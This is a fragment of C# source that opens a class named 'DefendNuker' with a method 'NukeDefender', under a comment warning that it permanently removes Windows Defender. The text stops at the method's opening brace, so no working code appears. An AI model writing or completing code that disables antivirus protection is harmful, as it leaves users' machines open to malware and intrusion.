...
{
	//WARNING
	//The following will perminantly remove windows defender from your device and has drastic consequences if misused.
	public static class DefendNuker
	{
		public static void NukeDefender()
		{
